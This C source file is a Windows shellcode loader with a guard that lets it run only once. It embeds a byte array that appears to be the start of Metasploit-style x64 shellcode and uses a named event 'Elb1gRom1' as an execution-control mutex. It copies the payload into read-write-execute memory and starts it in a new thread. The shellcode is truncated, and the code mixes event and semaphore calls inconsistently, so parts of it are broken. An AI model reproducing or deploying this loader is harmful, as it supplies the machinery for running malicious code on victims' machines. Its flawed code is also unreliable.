#include <Windows.h>
#include <stdio.h>

#define PAYLOAD_CONTROLER "Elb1gRom1"

// Payload
unsigned char Payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0";

HANDLE hSemaphore;

BOOL IsPayloadRunning() {
    hSemaphore = CreateEventA(NULL, 1, 1, PAYLOAD_CONTROLER); // Initial and max count = 1
    if (hSemaphore != NULL) {
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
            return TRUE;
        }
    }
    return FALSE;
}

DWORD WINAPI ShellcodeExecutor(LPVOID lpParam) {
    ((void(*)())lpParam)();
    return 0;
}

void ExecutePayload() {
    LPVOID execMemory = VirtualAlloc(NULL, sizeof(Payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory) {
        memcpy(execMemory, Payload, sizeof(Payload));
        HANDLE hThread = CreateThread(NULL, 0, ShellcodeExecutor, execMemory, 0, NULL);
        if (hThread) {
            printf("[+] Payload executed successfully\n");
            CloseHandle(hThread);
        }
        else {
            printf("[!] Failed to create thread\n");
        }
    }
    else {
        printf("[!] Memory allocation failed\n");
    }
}

int main() {
    if (!IsPayloadRunning()) {
        printf("[i] Running Payload ...\n");
        if (WaitForSingleObject(hSemaphore, 0) == WAIT_OBJECT_0) { // Try to acquire semaphore
            ExecutePayload();
        }
        ReleaseSemaphore(hSemaphore, 1, NULL); // Release the semaphore
    }
    else {
        printf("[!] Payload is already running\n");
    }
    if (!IsPayloadRunning()) {
        printf("[i] Running Payload ...\n");
        if (WaitForSingleObject(hSemaphore, 0) == WAIT_OBJECT_0) { // Try to acquire semaphore
            ExecutePayload();
        }
        ReleaseSemaphore(hSemaphore, 1, NULL); // Release the semaphore
    }
    else {
        printf("[!] Payload is already running\n");
    }
    if (!IsPayloadRunning()) {
        printf("[i] Running Payload ...\n");
        if (WaitForSingleObject(hSemaphore, 0) == WAIT_OBJECT_0) { // Try to acquire semaphore
            ExecutePayload();
        }
        ReleaseSemaphore(hSemaphore, 1, NULL); // Release the semaphore
    }
    else {
        printf("[!] Payload is already running\n");
    }

    printf("[#] Press <Enter> to quit ... ");
    getchar();

    if (hSemaphore) {
        CloseHandle(hSemaphore);
    }
    return 0;
}
